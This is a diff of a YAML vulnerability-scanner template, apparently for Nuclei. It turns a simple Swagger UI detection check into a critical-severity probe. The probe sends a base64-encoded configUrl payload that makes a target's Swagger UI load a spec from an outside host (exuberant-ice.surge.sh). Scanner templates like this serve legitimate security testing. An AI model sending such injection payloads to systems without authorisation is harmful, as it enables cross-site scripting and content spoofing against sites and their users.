@@ -1,21 +1,29 @@
-id: swagger
+id: swagger_51pwn
+
 info:
-  name: swagger
-  author: cn-kali-team
-  tags: detect,tech,swagger
-  severity: info
-  metadata:
-    product: swagger
-    vendor: 00_unknown
-    verified: false
-http:
-- method: GET
-  path:
-  - '{{BaseURL}}/'
-  matchers:
-  - type: word
-    words:
-    - swagger ui
-    - swagger-ui.css
-    - swagger-ui.js
-    case-insensitive: true
+  name: swagger api
+  author: 51pwn
+  severity: critical
+  description: |
+    swagger api
+
+requests:
+  - raw:
+      - |
+        GET /classicapi/doc/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ== HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - 'swagger.yaml'
+        condition: and
+      - type: word
+        words:
+          - 'exuberant-ice.surge.sh'
+        condition: and
